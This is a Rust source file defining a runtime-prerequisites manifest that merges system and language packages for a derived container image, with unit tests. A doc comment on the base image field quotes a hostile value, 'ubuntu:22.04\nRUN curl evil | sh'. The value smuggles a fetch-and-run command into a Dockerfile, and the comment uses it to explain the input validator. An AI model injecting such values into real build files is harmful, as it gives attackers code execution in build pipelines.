//! Derived-image warm-up — aggregated runtime prereqs.
//!
//! The compiler aggregates declared system + language packages from
//! the selected archetype/taxonomy's `runtime_baseline` block and
//! every reachable atom's `spec_preferred_methods.*.runtime_packages`
//! into a single manifest, written at emit time as
//! `policies/runtime-prereqs.json`. The harness pre-flight reads this
//! manifest, derives a content-addressed image from
//! `base_image` + the union, and runs the workflow against the
//! derived image.
//!
//! The manifest is **always emitted**, even when every field is
//! empty, so downstream consumers can rely on its presence and the
//! per-package BagIt manifest captures one stable hash per package.
//!
//! Determinism: every collection is a `BTreeSet<String>` so JSON
//! serialization is byte-stable across emit calls. Identical input →
//! identical bytes → identical sha512 in `manifest-sha512.txt`.
//!
//! Aggregation is the **union** over every candidate method in every
//! reachable `discover_*` atom (not just the eventual choice). The
//! pre-flight has no way to know which method claude will pick at
//! runtime, so it must install enough to satisfy any of them. Yes,
//! that over-installs; the per-session cache amortizes the cost.

use std::collections::BTreeSet;

use serde::{Deserialize, Serialize};
use ts_rs::TS;

/// Top-level manifest serialized as `policies/runtime-prereqs.json`.
#[derive(
    Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize, TS, schemars::JsonSchema,
)]
#[ts(export)]
#[serde(deny_unknown_fields)]
pub struct RuntimePrereqs {
    /// Schema version of this manifest. Bump when a breaking change
    /// is added (e.g. a new top-level required field).
    pub schema_version: u32,

    /// The modality this package was compiled for. Surfaced for
    /// operator-debugging and SBOM provenance; the harness does not
    /// route on it.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub modality: Option<String>,

    /// Base image to derive from. When `None`, the harness skips the
    /// derived-image build and falls back to the host-mode (or
    /// per-task `container.image`) path. When set, written into the
    /// generated `runtime/derived-image.Dockerfile`'s `FROM` line.
    ///
    /// The deserialize path validates the
    /// OCI image reference shape (`^[a-z0-9][a-z0-9._/:-]*(:tag|@sha256:<hex>)?$`)
    /// so YAML/JSON loaders refuse hostile values like
    /// `ubuntu:22.04\nRUN curl evil | sh` before they reach the
    /// Dockerfile renderer. See
    /// `crate::derived_image::validate_base_image`.
    #[serde(
        default,
        skip_serializing_if = "Option::is_none",
        deserialize_with = "validate_base_image_on_deserialize"
    )]
    pub base_image: Option<String>,

    /// OS-level packages requiring root inside the build (apt/dnf).
    /// These cannot be installed at runtime by the non-root agent
    /// container, so the derived-image build is the only path.
    #[serde(default)]
    pub system_packages: SystemPackages,

    /// Language-level packages installable in the user-writable
    /// per-session cache by either the build (baked in) or by claude
    /// at runtime (organic install). Baked-in installs are deterministic
    /// + reproducible; runtime installs handle the long tail.
    #[serde(default)]
    pub language_packages: LanguagePackages,

    /// Sanity-check assertions of binary presence + minimum versions
    /// (e.g. `R>=4.4`, `python3>=3.12`). Surfaced into the agent's
    /// env_capability.json probe so a missing baseline tool fails
    /// loud at session start, not at task time.
    #[serde(default, skip_serializing_if = "BTreeSet::is_empty")]
    pub system_check: BTreeSet<String>,
}

/// OS-level packages keyed by package manager. `apt` covers
/// Debian/Ubuntu base images; `dnf` covers RHEL/Fedora/Alma. Other
/// managers can be added behind new fields when their first consumer
/// shows up; the schema is `additionalProperties: false` so unknown
/// keys fail at load time rather than silently dropping.
#[derive(
    Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize, TS, schemars::JsonSchema,
)]
#[ts(export)]
#[serde(deny_unknown_fields)]
pub struct SystemPackages {
    #[serde(default, skip_serializing_if = "BTreeSet::is_empty")]
    /// Apt.
    pub apt: BTreeSet<String>,
    #[serde(default, skip_serializing_if = "BTreeSet::is_empty")]
    /// Dnf.
    pub dnf: BTreeSet<String>,
}

impl SystemPackages {
    /// Is empty.
    pub fn is_empty(&self) -> bool {
        self.apt.is_empty() && self.dnf.is_empty()
    }
}

/// Language-level package declarations. Both R and python entries
/// are version-spec strings (`Seurat>=5.0`, `scanpy>=1.10`). The
/// builder script renders them into `R -e 'install.packages(...)'`
/// And `pip install...` lines respectively.
///
/// `conda` is provided for taxonomies whose dependencies are
/// distributed via conda-forge / bioconda. The builder routes conda
/// Packages through `conda install -c bioconda -c conda-forge...`
/// only when conda is available in the base image; otherwise the
/// build skips the conda layer with a stderr warning.
#[derive(
    Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize, TS, schemars::JsonSchema,
)]
#[ts(export)]
#[serde(deny_unknown_fields)]
pub struct LanguagePackages {
    #[serde(default, skip_serializing_if = "BTreeSet::is_empty")]
    /// R.
    pub r: BTreeSet<String>,
    #[serde(default, skip_serializing_if = "BTreeSet::is_empty")]
    /// Python.
    pub python: BTreeSet<String>,
    #[serde(default, skip_serializing_if = "BTreeSet::is_empty")]
    /// Conda.
    pub conda: BTreeSet<String>,
}

impl LanguagePackages {
    /// Is empty.
    pub fn is_empty(&self) -> bool {
        self.r.is_empty() && self.python.is_empty() && self.conda.is_empty()
    }
}

impl RuntimePrereqs {
    /// Convenience: fresh manifest with the current schema version
    /// and every collection empty. The helper exists so callers don't
    /// need to remember the schema version constant.
    pub fn new() -> Self {
        Self {
            schema_version: SCHEMA_VERSION,
            ..Default::default()
        }
    }

    /// True when the manifest declares system-level packages on top
    /// of a base image — i.e. when a fresh derived image is needed
    /// to bake the apt / dnf delta in. Language packages alone do
    /// NOT make a manifest buildable: per the directive,
    /// language packages (R / Python / conda) install at task time
    /// in the per-session cache and never bake into the image.
    /// Manifests with a base but no system delta short-circuit to
    /// "use the base image directly" in the harness pre-flight.
    pub fn is_buildable(&self) -> bool {
        self.base_image.is_some() && !self.system_packages.is_empty()
    }

    /// Group declared packages by registry. Used by the
    /// install-proxy shims to render the per-task `provisioning.json`
    /// that gets bind-mounted into the container at
    /// `/etc/scripps-workflow/provisioning.json`.
    ///
    /// Bucketing:
    /// - `system_packages.apt` and `system_packages.dnf` map to their
    ///   own registries ("apt" / "dnf") so the apt and dnf shims each
    ///   see only their own packages.
    /// - `language_packages.r` is exposed as "cran" — that's the
    ///   registry the Rscript shim consults at install time (CRAN is
    ///   the default repository; Bioconductor entries flow through
    ///   the same shim and the package name carries the namespace).
    /// - `language_packages.python` is exposed as "pip".
    /// - `language_packages.conda` is exposed as "conda".
    ///
    /// Output is a `BTreeMap` so the rendered JSON is byte-stable
    /// across emits — the same atom-set + safety policy must produce
    /// identical `provisioning.json` files (the install-proxy is the
    /// trust boundary; non-determinism here would break per-task
    /// reproducibility).
    pub fn declared_per_registry(&self) -> std::collections::BTreeMap<String, Vec<String>> {
        let mut out: std::collections::BTreeMap<String, Vec<String>> = Default::default();
        if !self.system_packages.apt.is_empty() {
            out.insert(
                "apt".into(),
                self.system_packages.apt.iter().cloned().collect(),
            );
        }
        if !self.system_packages.dnf.is_empty() {
            out.insert(
                "dnf".into(),
                self.system_packages.dnf.iter().cloned().collect(),
            );
        }
        if !self.language_packages.r.is_empty() {
            out.insert(
                "cran".into(),
                self.language_packages.r.iter().cloned().collect(),
            );
        }
        if !self.language_packages.python.is_empty() {
            out.insert(
                "pip".into(),
                self.language_packages.python.iter().cloned().collect(),
            );
        }
        if !self.language_packages.conda.is_empty() {
            out.insert(
                "conda".into(),
                self.language_packages.conda.iter().cloned().collect(),
            );
        }
        out
    }

    /// Merge another manifest into this one. Used by the emitter to
    /// fold per-method prereqs into the baseline. `base_image` and
    /// `modality` from `self` win when both sides set them — the
    /// baseline owns those decisions.
    pub fn merge(&mut self, other: RuntimePrereqs) {
        if self.base_image.is_none() {
            self.base_image = other.base_image;
        }
        if self.modality.is_none() {
            self.modality = other.modality;
        }
        self.system_packages.apt.extend(other.system_packages.apt);
        self.system_packages.dnf.extend(other.system_packages.dnf);
        self.language_packages.r.extend(other.language_packages.r);
        self.language_packages
            .python
            .extend(other.language_packages.python);
        self.language_packages
            .conda
            .extend(other.language_packages.conda);
        self.system_check.extend(other.system_check);
    }
}

/// Bumped only when a breaking schema change lands. Additive
/// changes (new optional fields, new collections) keep `1`.
pub const SCHEMA_VERSION: u32 = 1;

/// Aggregator: union the archetype's `runtime_baseline` with each
/// composed atom's `runtime_packages`. Used by the composer-driven
/// path (composer_version >= 2). The composer's
/// `CompositionResult.atoms` carries `ComposedAtom` whose `atom`
/// field is the source `AtomDefinition` — pass that through.
pub fn aggregate_archetype(
    archetype: &crate::archetype::ArchetypeDefinition,
    atoms: &[crate::atom::AtomDefinition],
) -> RuntimePrereqs {
    let mut out = archetype.runtime_baseline.clone();
    if out.schema_version == 0 {
        out.schema_version = SCHEMA_VERSION;
    }
    for a in atoms {
        out.merge(a.runtime_packages.clone());
    }
    out
}

/// Phase B4 — back-compat shim. Pre-B4 sessions carried
/// `StageTaxonomy.runtime_baseline` populated from the legacy YAML.
/// With the YAML loader gone, this just clones the (possibly empty)
/// baseline that the session re-hydrated from JSON. The atom slice
/// argument is preserved for call-site symmetry with
/// `aggregate_archetype`; pass `&[]` when the caller doesn't have the
/// matched atom catalog in scope.
pub fn aggregate_taxonomy(
    taxonomy: &crate::taxonomy::StageTaxonomy,
    atoms: &[crate::atom::AtomDefinition],
) -> RuntimePrereqs {
    let mut out = taxonomy.runtime_baseline.clone();
    if out.schema_version == 0 {
        out.schema_version = SCHEMA_VERSION;
    }
    for a in atoms {
        out.merge(a.runtime_packages.clone());
    }
    out
}

/// Security audit `serde::deserialize_with`
/// adapter applied to `RuntimePrereqs.base_image`. Refuses any value
/// that isn't a canonical OCI image reference, so a hostile YAML /
/// JSON loader can't smuggle Dockerfile escape sequences past the
/// pre-flight builder.
fn validate_base_image_on_deserialize<'de, D>(deserializer: D) -> Result<Option<String>, D::Error>
where
    D: serde::Deserializer<'de>,
{
    let raw: Option<String> = Option::deserialize(deserializer)?;
    match raw.as_deref() {
        None => Ok(None),
        Some(s) => {
            crate::derived_image::validate_base_image(s).map_err(serde::de::Error::custom)?;
            Ok(raw)
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn default_is_unbuildable_empty_v1() {
        let m = RuntimePrereqs::new();
        assert_eq!(m.schema_version, SCHEMA_VERSION);
        assert!(m.base_image.is_none());
        assert!(m.system_packages.is_empty());
        assert!(m.language_packages.is_empty());
        assert!(
            !m.is_buildable(),
            "fresh manifest with no base_image must not be buildable"
        );
    }

    #[test]
    fn round_trip_serde_preserves_contents() {
        let mut m = RuntimePrereqs::new();
        m.modality = Some("single_cell_rnaseq".into());
        m.base_image = Some("ghcr.io/scripps/scripps-bio-base:0.1.0".into());
        m.system_packages
            .apt
            .extend(["libcurl4-openssl-dev".into(), "libxml2-dev".into()]);
        m.language_packages
            .r
            .extend(["Seurat>=5.0".into(), "BPCells".into()]);
        m.language_packages
            .python
            .extend(["scanpy>=1.10".into(), "anndata>=0.10".into()]);
        m.system_check.insert("R>=4.4".into());

        let json = serde_json::to_string(&m).expect("serialize ok");
        let m2: RuntimePrereqs = serde_json::from_str(&json).expect("deserialize ok");
        assert_eq!(m, m2, "manifest must round-trip lossless through JSON");
    }

    #[test]
    fn json_serialization_is_byte_deterministic() {
        // Insert in different orders; BTreeSet must yield the same JSON.
        let mut a = RuntimePrereqs::new();
        a.language_packages
            .r
            .extend(["Seurat".into(), "BPCells".into(), "harmony".into()]);

        let mut b = RuntimePrereqs::new();
        b.language_packages
            .r
            .extend(["harmony".into(), "Seurat".into(), "BPCells".into()]);

        assert_eq!(
            serde_json::to_string(&a).unwrap(),
            serde_json::to_string(&b).unwrap(),
            "BTreeSet must canonicalize collection order — operators rely on \
             byte-deterministic manifest output for SBOM + reproducibility checks"
        );
    }

    #[test]
    fn merge_baseline_wins_for_scalar_fields() {
        let mut baseline = RuntimePrereqs {
            schema_version: SCHEMA_VERSION,
            modality: Some("scrnaseq".into()),
            base_image: Some("base:1".into()),
            ..Default::default()
        };
        baseline.language_packages.r.insert("Seurat".into());

        let method = RuntimePrereqs {
            schema_version: SCHEMA_VERSION,
            modality: Some("OTHER".into()),
            base_image: Some("OTHER:2".into()),
            language_packages: LanguagePackages {
                r: ["BPCells".into()].into(),
                python: ["scanpy".into()].into(),
                conda: BTreeSet::new(),
            },
            ..Default::default()
        };
        baseline.merge(method);

        assert_eq!(
            baseline.modality.as_deref(),
            Some("scrnaseq"),
            "modality from baseline must win"
        );
        assert_eq!(
            baseline.base_image.as_deref(),
            Some("base:1"),
            "base_image from baseline must win"
        );
        assert!(baseline.language_packages.r.contains("Seurat"));
        assert!(baseline.language_packages.r.contains("BPCells"));
        assert!(baseline.language_packages.python.contains("scanpy"));
    }

    #[test]
    fn merge_takes_method_base_image_when_baseline_unset() {
        let mut baseline = RuntimePrereqs::new();
        let method = RuntimePrereqs {
            schema_version: SCHEMA_VERSION,
            base_image: Some("ghcr.io/from-method:1".into()),
            ..Default::default()
        };
        baseline.merge(method);
        assert_eq!(
            baseline.base_image.as_deref(),
            Some("ghcr.io/from-method:1")
        );
    }

    #[test]
    fn is_buildable_requires_base_image_and_system_packages() {
        let mut m = RuntimePrereqs::new();
        m.base_image = Some("base:1".into());
        assert!(!m.is_buildable(), "base alone (no packages) is a no-op");

        // Language packages alone do NOT make a manifest buildable —
        // they install at task time in the agent's per-session cache,
        // Not at derived-image build time (directive).
        m.language_packages.r.insert("Seurat".into());
        assert!(
            !m.is_buildable(),
            "language packages alone do not require a derived image"
        );

        m.system_packages.apt.insert("samtools".into());
        assert!(
            m.is_buildable(),
            "apt delta on top of base image triggers a derived build"
        );

        m.base_image = None;
        assert!(
            !m.is_buildable(),
            "packages alone (no base) is uninstallable"
        );
    }

    #[test]
    fn deny_unknown_fields_at_top_level() {
        // The schema is closed: typos must fail loudly at load time.
        let bad = r#"{ "schema_version": 1, "weird_field": true }"#;
        let res: Result<RuntimePrereqs, _> = serde_json::from_str(bad);
        assert!(res.is_err(), "unknown top-level field must fail to parse");
    }

    // Declared_per_registry buckets packages into the
    // registry namespaces the install-proxy shims expect. The mapping
    // is load-bearing for the per-task `provisioning.json` contract;
    // pin every namespace and the deterministic ordering here.

    #[test]
    fn declared_per_registry_empty_when_no_packages() {
        let m = RuntimePrereqs::new();
        let out = m.declared_per_registry();
        assert!(
            out.is_empty(),
            "no declared packages → empty per-registry map"
        );
    }

    #[test]
    fn declared_per_registry_buckets_every_namespace() {
        let mut m = RuntimePrereqs::new();
        m.system_packages.apt.insert("samtools".into());
        m.system_packages.apt.insert("bwa".into());
        m.system_packages.dnf.insert("htslib-devel".into());
        m.language_packages.r.insert("Seurat".into());
        m.language_packages.python.insert("pandas".into());
        m.language_packages.python.insert("scanpy".into());
        m.language_packages.conda.insert("bioconda::salmon".into());

        let out = m.declared_per_registry();
        assert_eq!(
            out.get("apt").map(|v| v.as_slice()),
            Some(&["bwa".to_string(), "samtools".to_string()][..]),
            "apt bucket carries system_packages.apt sorted by BTreeSet ordering"
        );
        assert_eq!(
            out.get("dnf").map(|v| v.as_slice()),
            Some(&["htslib-devel".to_string()][..]),
            "dnf bucket carries system_packages.dnf"
        );
        assert_eq!(
            out.get("cran").map(|v| v.as_slice()),
            Some(&["Seurat".to_string()][..]),
            "R language packages route under the `cran` registry"
        );
        assert_eq!(
            out.get("pip").map(|v| v.as_slice()),
            Some(&["pandas".to_string(), "scanpy".to_string()][..]),
            "python language packages route under the `pip` registry"
        );
        assert_eq!(
            out.get("conda").map(|v| v.as_slice()),
            Some(&["bioconda::salmon".to_string()][..]),
            "conda language packages keep their own registry name"
        );
    }

    #[test]
    fn declared_per_registry_omits_empty_buckets() {
        // Only apt is set — no empty CRAN/pip/conda keys should appear
        // in the JSON the install-proxy reads.
        let mut m = RuntimePrereqs::new();
        m.system_packages.apt.insert("samtools".into());
        let out = m.declared_per_registry();
        assert_eq!(out.len(), 1);
        assert!(out.contains_key("apt"));
        assert!(!out.contains_key("dnf"));
        assert!(!out.contains_key("pip"));
        assert!(!out.contains_key("cran"));
        assert!(!out.contains_key("conda"));
    }

    #[test]
    fn declared_per_registry_byte_deterministic_across_insert_orders() {
        let mut a = RuntimePrereqs::new();
        a.system_packages
            .apt
            .extend(["samtools".into(), "bwa".into(), "minimap2".into()]);
        a.language_packages
            .python
            .extend(["pandas".into(), "scanpy".into()]);

        let mut b = RuntimePrereqs::new();
        b.system_packages
            .apt
            .extend(["minimap2".into(), "samtools".into(), "bwa".into()]);
        b.language_packages
            .python
            .extend(["scanpy".into(), "pandas".into()]);

        assert_eq!(
            serde_json::to_string(&a.declared_per_registry()).unwrap(),
            serde_json::to_string(&b.declared_per_registry()).unwrap(),
            "per-task provisioning.json must be byte-stable — the \
             install-proxy contract relies on the same packages \
             rendering the same JSON every emit"
        );
    }
}
